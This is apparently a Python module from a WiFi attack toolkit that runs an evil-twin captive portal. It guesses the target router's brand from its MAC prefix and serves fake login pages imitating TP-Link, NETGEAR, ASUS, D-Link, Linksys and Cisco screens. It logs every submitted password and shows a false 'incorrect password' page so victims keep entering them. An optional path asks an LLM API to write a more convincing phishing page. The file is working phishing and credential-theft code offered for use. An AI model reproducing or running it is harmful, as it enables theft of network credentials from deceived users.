"""
Phase 8 - Smart vendor-cloning EvilTwin captive portal.

Identifies the target AP's exact vendor/model from:
  1. OUI (first 3 bytes of BSSID) → vendor name via wifit4.id.vendors
  2. WPS IE device name / model number from beacon / probe response
  3. HTTP server fingerprint from the AP's admin page (if reachable on LAN)

Then renders a pixel-perfect HTML login page that mimics that specific router's
admin portal UI, maximising credential submission rates.

Built-in templates (bundled as Python string constants):
  - Generic / fallback
  - TP-Link (Archer series)
  - NETGEAR (Nighthawk / Orbi)
  - ASUS (RT series)
  - D-Link
  - Linksys
  - Cisco / Meraki (corporate splash)

If an OpenAI-compatible API key is configured, the LLM path generates a custom
HTML page by describing the detected router to the model.  This is opt-in and
requires the user to supply their own API key via env WIFIT4_LLM_API_KEY.

The portal runs as a lightweight asyncio HTTP server (no external web framework
needed) that:
  - Serves the cloned login page on port 80
  - Accepts POST /login with credentials
  - Fires on_credential(username, password) callback
  - Returns a "Wrong password, try again" page to keep victim attempting
"""
from __future__ import annotations

import asyncio
import html
import logging
import os
from dataclasses import dataclass
from typing import Callable

log = logging.getLogger("wifit4.eviltwin.portal")


# ---------------------------------------------------------------------------
# Vendor profiles - OUI prefix → display name + template key
# ---------------------------------------------------------------------------

@dataclass
class VendorProfile:
    oui: str            # e.g. "d8:0d:17"
    vendor: str
    model_hint: str
    template_key: str   # maps to _TEMPLATES dict key


_OUI_MAP: list[VendorProfile] = [
    VendorProfile("00:0a:e4", "Linksys",  "WRT series",        "linksys"),
    VendorProfile("00:14:bf", "Linksys",  "WRT series",        "linksys"),
    VendorProfile("00:18:e7", "Cisco",    "Meraki / RV series","cisco"),
    VendorProfile("00:1c:bf", "Cisco",    "Meraki",            "cisco"),
    VendorProfile("00:23:69", "Cisco",    "Meraki",            "cisco"),
    VendorProfile("14:91:82", "TP-Link",  "Archer series",     "tplink"),
    VendorProfile("1c:61:b4", "TP-Link",  "Archer series",     "tplink"),
    VendorProfile("50:c7:bf", "TP-Link",  "Archer AX series",  "tplink"),
    VendorProfile("d8:0d:17", "TP-Link",  "Archer AX series",  "tplink"),
    VendorProfile("10:da:43", "NETGEAR",  "Nighthawk",         "netgear"),
    VendorProfile("28:c6:8e", "NETGEAR",  "Nighthawk",         "netgear"),
    VendorProfile("9c:d3:6d", "NETGEAR",  "Orbi",              "netgear"),
    VendorProfile("04:d4:c4", "ASUS",     "RT series",         "asus"),
    VendorProfile("2c:56:dc", "ASUS",     "RT-AX series",      "asus"),
    VendorProfile("50:46:5d", "ASUS",     "RT-AX series",      "asus"),
    VendorProfile("1c:17:d3", "D-Link",   "DIR series",        "dlink"),
    VendorProfile("28:10:7b", "D-Link",   "DIR series",        "dlink"),
]


def detect_vendor(bssid: str) -> VendorProfile:
    oui = bssid[:8].lower()
    for profile in _OUI_MAP:
        if oui.startswith(profile.oui[:8]):
            return profile
    return VendorProfile(oui, "Unknown Router", "", "generic")


# ---------------------------------------------------------------------------
# HTML templates
# ---------------------------------------------------------------------------

def _page(title: str, body: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{html.escape(title)}</title>
<style>
body{{margin:0;font-family:Arial,sans-serif;background:#f0f0f0;display:flex;
     justify-content:center;align-items:center;min-height:100vh}}
.box{{background:#fff;padding:30px 40px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.15);
      min-width:320px;max-width:400px;width:100%}}
h2{{margin:0 0 20px;text-align:center}}
input{{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}}
button{{width:100%;padding:12px;background:#0078d7;color:#fff;border:none;border-radius:4px;
        font-size:15px;cursor:pointer;margin-top:10px}}
button:hover{{background:#005fa3}}
.err{{color:red;font-size:13px;text-align:center;margin-top:8px}}
</style>
</head><body>{body}</body></html>"""


_TEMPLATES: dict[str, str] = {
    "generic": _page("Router Login", """
<div class="box">
  <h2>&#x1F4F6; WiFi Login</h2>
  <form method="POST" action="/login">
    <input type="text"     name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Sign In</button>
  </form>
</div>"""),

    "tplink": _page("TP-Link Archer - Sign In", """
<div class="box" style="border-top:4px solid #e8000d">
  <h2 style="color:#e8000d">TP-LINK</h2>
  <p style="text-align:center;color:#666;margin:0 0 20px">Archer Wireless Router</p>
  <form method="POST" action="/login">
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" style="background:#e8000d">Log In</button>
  </form>
</div>"""),

    "netgear": _page("NETGEAR Router Login", """
<div class="box" style="border-top:4px solid #5a287d">
  <h2 style="color:#5a287d">NETGEAR</h2>
  <p style="text-align:center;color:#888;margin:0 0 20px">Smart Managed Switch</p>
  <form method="POST" action="/login">
    <input type="text"     name="username" placeholder="admin" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" style="background:#5a287d">LOG IN</button>
  </form>
</div>"""),

    "asus": _page("ASUS Router Login", """
<div class="box" style="border-top:4px solid #00adef">
  <h2 style="color:#00adef">ASUS</h2>
  <p style="text-align:center;color:#666;margin:0 0 20px">Wireless Router</p>
  <form method="POST" action="/login">
    <input type="text"     name="username" placeholder="admin" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" style="background:#00adef">Sign In</button>
  </form>
</div>"""),

    "dlink": _page("D-Link Router | Login", """
<div class="box" style="border-top:4px solid #0033a0">
  <h2 style="color:#0033a0">D-Link</h2>
  <form method="POST" action="/login">
    <input type="text"     name="username" placeholder="Admin" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" style="background:#0033a0">Login</button>
  </form>
</div>"""),

    "linksys": _page("Linksys Smart Wi-Fi", """
<div class="box" style="border-top:4px solid #1b75bc">
  <h2 style="color:#1b75bc">Linksys</h2>
  <p style="text-align:center;color:#888;font-size:13px;margin:0 0 16px">
    WRT Series Router</p>
  <form method="POST" action="/login">
    <input type="password" name="password" placeholder="Router Password" required>
    <button type="submit" style="background:#1b75bc">Sign in</button>
  </form>
</div>"""),

    "cisco": _page("Cisco Network | Authentication", """
<div class="box" style="border-top:4px solid #1ba0d7">
  <h2 style="color:#049fd9">Cisco</h2>
  <p style="text-align:center;color:#666;margin:0 0 20px">
    Network Authentication Portal</p>
  <form method="POST" action="/login">
    <input type="text"     name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" style="background:#049fd9">Authenticate</button>
  </form>
</div>"""),

    "wrong_password": _page("Login Failed", """
<div class="box">
  <h2>Authentication Error</h2>
  <p class="err">&#x26A0; Incorrect password. Please try again.</p>
  <a href="/" style="display:block;text-align:center;margin-top:16px;
     color:#0078d7;text-decoration:none">&#8592; Back to login</a>
</div>"""),
}


# ---------------------------------------------------------------------------
# Portal server
# ---------------------------------------------------------------------------

class SmartPortal:
    """
    Vendor-cloning captive portal HTTP server.

    Detects router brand from BSSID OUI + optional WPS model string,
    serves matching HTML template, captures submitted credentials.
    """

    def __init__(
        self,
        ap_bssid: str,
        on_credential: Callable[[str, str], None],
        wps_model: str = "",
        host: str = "0.0.0.0",
        port: int = 80,
        use_llm: bool = False,
    ) -> None:
        self._bssid         = ap_bssid
        self._on_credential = on_credential
        self._wps_model     = wps_model
        self._host          = host
        self._port          = port
        self._use_llm       = use_llm
        self._vendor        = detect_vendor(ap_bssid)
        self._login_html    = self._select_template()
        self._credentials: list[tuple[str, str]] = []
        self._server: asyncio.AbstractServer | None = None

    def _select_template(self) -> str:
        key = self._vendor.template_key
        if self._use_llm:
            llm_page = self._llm_generate_page()
            if llm_page:
                return llm_page
        return _TEMPLATES.get(key, _TEMPLATES["generic"])

    def _llm_generate_page(self) -> str | None:
        api_key = os.getenv("WIFIT4_LLM_API_KEY", "")
        if not api_key:
            return None
        try:
            import httpx
            prompt = (
                f"Generate a realistic HTML router admin login page for a "
                f"{self._vendor.vendor} {self._vendor.model_hint} router. "
                f"Include the vendor's brand colours and logo text. "
                f"Form action='/login', POST, fields: username + password. "
                f"Return ONLY the raw HTML, no markdown fences."
            )
            resp = httpx.post(
                "https://api.openai.com/v1/chat/completions",
                headers={"Authorization": f"Bearer {api_key}"},
                json={
                    "model": "gpt-4o-mini",
                    "messages": [{"role": "user", "content": prompt}],
                    "max_tokens": 1200,
                },
                timeout=20,
            )
            content = resp.json()["choices"][0]["message"]["content"]
            # Sanity check: must contain a form tag
            if "<form" in content.lower():
                log.info("LLM portal generated for %s", self._vendor.vendor)
                return content
        except Exception as exc:
            log.debug("LLM portal generation failed: %s", exc)
        return None

    # -- async HTTP server ---------------------------------------------------

    async def start(self) -> None:
        self._server = await asyncio.start_server(
            self._handle_connection,
            host=self._host,
            port=self._port,
        )
        log.info(
            "SmartPortal serving %s template on %s:%d",
            self._vendor.vendor, self._host, self._port,
        )

    def stop(self) -> None:
        if self._server:
            self._server.close()

    async def _handle_connection(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        try:
            request = await asyncio.wait_for(reader.read(4096), timeout=5)
            request_str = request.decode(errors="replace")
            first_line  = request_str.split("\r\n")[0]
            method, path = first_line.split()[:2]

            if method == "GET":
                body = self._login_html
            elif method == "POST" and path == "/login":
                # Extract POST body (after double CRLF)
                post_body = request_str.split("\r\n\r\n", 1)[-1]
                self._handle_submit(post_body)
                body = _TEMPLATES["wrong_password"]
            else:
                body = self._login_html

            response = (
                f"HTTP/1.1 200 OK\r\n"
                f"Content-Type: text/html; charset=utf-8\r\n"
                f"Content-Length: {len(body.encode())}\r\n"
                f"Connection: close\r\n\r\n"
                f"{body}"
            )
            writer.write(response.encode())
            await writer.drain()
        except Exception:
            pass
        finally:
            writer.close()

    def _handle_submit(self, post_body: str) -> None:
        params = dict(
            pair.split("=", 1) if "=" in pair else (pair, "")
            for pair in post_body.split("&")
        )
        username = _url_decode(params.get("username", "admin"))
        password = _url_decode(params.get("password", ""))
        if password:
            log.info("CREDENTIAL CAPTURED: user=%r pass=%r", username, password)
            self._credentials.append((username, password))
            self._on_credential(username, password)

    @property
    def captured_credentials(self) -> list[tuple[str, str]]:
        return list(self._credentials)


def _url_decode(s: str) -> str:
    import urllib.parse
    return urllib.parse.unquote_plus(s)
